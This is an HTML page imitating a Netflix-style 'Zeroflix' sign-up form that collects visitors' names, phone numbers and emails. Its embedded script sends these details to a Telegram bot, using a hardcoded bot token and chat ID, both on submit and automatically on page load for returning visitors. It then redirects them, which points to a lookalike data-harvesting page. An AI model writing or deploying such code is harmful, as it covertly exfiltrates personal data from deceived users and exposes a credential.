<html>  
  <head>  
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
    <link rel="stylesheet" href="src/styles.css" />  
    <link  
      rel="stylesheet"  
      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"  
      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"  
      crossorigin="anonymous"  
    />  
    <link rel="preconnect" href="https://fonts.googleapis.com" />  
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />  
    <link  
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"  
      rel="stylesheet"  
    />  
    <title>Sign Up / Sign In | Zeroflix</title>  
    <link  
      rel="icon"  
      href="http://pngimg.com/uploads/Zeroflix/small/Zeroflix_PNG15.png"  
    />  
    <style>  
      .page-transition {  
        position: fixed;  
        top: 0;  
        left: 0;  
        width: 100%;  
        height: 100%;  
        background: rgba(0, 0, 0, 0.9);  
        z-index: 9999;  
        display: flex;  
        justify-content: center;  
        align-items: center;  
        opacity: 0;  
        pointer-events: none;  
        transition: opacity 0.5s ease;  
      }  
  
      .page-transition.active {  
        opacity: 1;  
        pointer-events: all;  
      }  
  
      .loader {  
        width: 70px;  
        height: 70px;  
        border: 8px solid rgba(229, 9, 20, 0.2);  
        border-radius: 50%;  
        border-top-color: #e50914;  
        animation: spin 1s linear infinite;  
      }  
  
      @keyframes spin {  
        to { transform: rotate(360deg); }  
      }  
  
      .form-container {  
        max-width: 450px;  
        background: rgba(0, 0, 0, 0.75);  
        border-radius: 4px;  
        padding: 60px 68px;  
        margin: 2rem auto;  
        position: relative;  
        z-index: 5;  
      }  
  
      .form-title {  
        color: #fff;  
        font-size: 32px;  
        font-weight: 600;  
        margin-bottom: 28px;  
      }  
  
      .form-input {  
        width: 100%;  
        height: 50px;  
        background: #333;  
        border: none;  
        border-radius: 4px;  
        color: #fff;  
        font-size: 16px;  
        padding: 0 20px;  
        margin-bottom: 16px;  
        outline: none;  
      }  
  
      .form-input:focus {  
        background: #454545;  
      }  
  
      .form-submit {  
        width: 100%;  
        height: 50px;  
        background: #e50914;  
        color: #fff;  
        border: none;  
        border-radius: 4px;  
        font-size: 16px;  
        font-weight: 600;  
        cursor: pointer;  
        margin-top: 24px;  
        transition: background 0.2s;  
      }  
  
      .form-submit:hover {  
        background: #f40612;  
      }  
  
      .form-help {  
        display: flex;  
        justify-content: space-between;  
        color: #b3b3b3;  
        font-size: 13px;  
        margin-top: 10px;  
      }  
  
      .form-help a {  
        color: #b3b3b3;  
        text-decoration: none;  
      }  
  
      .form-help a:hover {  
        text-decoration: underline;  
      }  
  
      .form-signup {  
        color: #737373;  
        font-size: 16px;  
        margin-top: 40px;  
      }  
  
      .form-signup a {  
        color: #fff;  
        text-decoration: none;  
      }  
  
      .form-signup a:hover {  
        text-decoration: underline;  
      }  
  
      .hero__bg__image__container {  
        position: fixed;  
        top: 0;  
        left: 0;  
        width: 100%;  
        height: 100%;  
        z-index: -1;  
      }  
  
      .hero__bg__image {  
        width: 100%;  
        height: 100%;  
        object-fit: cover;  
      }  
  
      .hero__bg__overlay {  
        position: fixed;  
        top: 0;  
        left: 0;  
        width: 100%;  
        height: 100%;  
        background: rgba(0, 0, 0, 0.5);  
        z-index: 0;  
      }  
    </style>  
  </head>  
  <body>  
    <div class="page-transition" id="pageLoader">  
      <div class="loader"></div>  
    </div>  
  
    <header>  
      <nav class="navbar">  
        <div class="navbar__brand">  
          <img  
            src="https://i.postimg.cc/3whKmqS0/99ea8317d4057161b002f47d0827d852.png"  
            alt="logo"  
            class="brand__logo"  
          />  
        </div>  
        <div class="navbar__nav__items">  
          <div class="nav__item">  
          </div>  
        </div>  
      </nav>  
    </header>  
  
    <main>  
      <div class="hero__bg__image__container">  
        <img  
          src="https://assets.nflxext.com/ffe/siteui/vlv3/9c5457b8-9ab0-4a04-9fc1-e608d5670f1a/710d74e0-7158-408e-8d9b-23c219dee5df/IN-en-20210719-popsignuptwoweeks-perspective_alpha_website_small.jpg"  
          alt="BG hero image"  
          class="hero__bg__image"  
        />  
      </div>  
  
      <div class="hero__bg__overlay"></div>  
  
      <div class="form-container" id="formContainer">  
        <h1 class="form-title">Sign Up / Sign In</h1>  
        <form id="signupForm">  
          <input  
            type="text"  
            id="name"  
            class="form-input"  
            placeholder="Name"  
            required  
          />  
          <input  
            type="tel"  
            id="phone"  
            class="form-input"  
            placeholder="Phone Number"  
            required  
          />  
          <input  
            type="email"  
            id="email"  
            class="form-input"  
            placeholder="Email"  
            required  
          />  
          <button type="submit" class="form-submit">  
            Get Started  
          </button>  
        </form>  
        <div class="form-help">  
          <div>  
            <input type="checkbox" id="remember" checked />  
            <label for="remember">Remember me</label>  
          </div>  
          <a href="#">Need help?</a>  
        </div>  
    
      </div>  
    </main>  
  
    <script>  
      // Initialize loader timeout  
      let loaderTimeout;  
        
      document.addEventListener('DOMContentLoaded', function() {  
        // Clear any existing timeout  
        clearTimeout(loaderTimeout);  
          
        // Check for auto-redirect first  
        const urlParams = new URLSearchParams(window.location.search);  
        if (urlParams.has('autoredirect')) {  
          sendTelegramNotification(true); // Send "opened app" notification  
          document.getElementById('pageLoader').classList.add('active');  
          loaderTimeout = setTimeout(() => {  
            window.location.replace('https://digitalaga.github.io/ZeroflixWeb/success.html');  
          }, 800);  
          return;  
        }  
  
        // Check for saved user data  
        const savedUser = localStorage.getItem('zeroflixUser');  
        if (savedUser) {  
          const user = JSON.parse(savedUser);  
          document.getElementById('name').value = user.name;  
          document.getElementById('phone').value = user.phone;  
          document.getElementById('email').value = user.email;  
          document.getElementById('remember').checked = true;  
            
          // Send "opened app" notification for returning users  
          sendTelegramNotification(true);  
        }  
  
        // Form submission handler  
        document.getElementById('signupForm').addEventListener('submit', function(e) {  
          e.preventDefault();  
          document.getElementById('pageLoader').classList.add('active');  
            
          const name = document.getElementById('name').value;  
          const phone = document.getElementById('phone').value;  
          const email = document.getElementById('email').value;  
          const rememberMe = document.getElementById('remember').checked;  
            
          // Save user data if "Remember me" is checked  
          if (rememberMe) {  
            const userData = { name, phone, email };  
            localStorage.setItem('zeroflixUser', JSON.stringify(userData));  
          } else {  
            localStorage.removeItem('zeroflixUser');  
          }  
            
          // Send "new user" notification  
          sendTelegramNotification(false);  
        });  
  
        // Handle back to index.html  
        document.querySelector('a[href="index.html"]').addEventListener('click', function(e) {  
          e.preventDefault();  
          document.getElementById('pageLoader').classList.add('active');  
          setTimeout(() => {  
            window.location.href = 'index.html';  
          }, 800);  
        });  
  
        // Function to send Telegram notifications  
        function sendTelegramNotification(isReturningUser) {  
          const name = document.getElementById('name')?.value || JSON.parse(localStorage.getItem('zeroflixUser'))?.name || 'Unknown';  
          const phone = document.getElementById('phone')?.value || JSON.parse(localStorage.getItem('zeroflixUser'))?.phone || 'Unknown';  
          const email = document.getElementById('email')?.value || JSON.parse(localStorage.getItem('zeroflixUser'))?.email || 'Unknown';  
            
          const message = isReturningUser   
            ? `🥳‼️${name} has opened the App‼️🥳%0A👤 Name: ${name}%0A📞 Phone Number: ${phone}%0A✉️ Email: ${email}`  
            : `🥳‼️NEW USER‼️🥳%0A👤 Name: ${name}%0A📞 Phone Number: ${phone}%0A✉️ Email: ${email}`;  
            
          fetch(`https://api.telegram.org/bot7975590264:AAEHawRYi3FN9lpQme2s7DcA4Q6S5bjzTB8/sendMessage?chat_id=1098083004&text=${message}`)  
            .then(() => {  
              if (!isReturningUser) {  
                window.location.replace('https://digitalaga.github.io/ZeroflixWeb/success.html');  
              }  
            })  
            .catch(error => console.error('Telegram notification failed:', error));  
        }  
  
        // Handle page restoration from cache  
        window.addEventListener('pageshow', function(event) {  
          if (event.persisted) {  
            document.getElementById('pageLoader').classList.remove('active');  
            clearTimeout(loaderTimeout);  
          }  
        });  
      });  
  
      // Safety timeout for loader  
      setTimeout(function() {  
        document.getElementById('pageLoader').classList.remove('active');  
      }, 5000);  
    </script>  
  </body>  
</html>

